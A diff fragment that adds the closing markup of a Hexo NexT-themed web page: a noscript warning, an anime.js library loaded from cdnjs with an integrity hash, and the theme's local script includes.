+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/sidebar.js"></script><script src="/js/next-boot.js"></script>
+
+  
+
+
+
+
+
+
+  
+
+
+
+
+
+</body>
+</html>
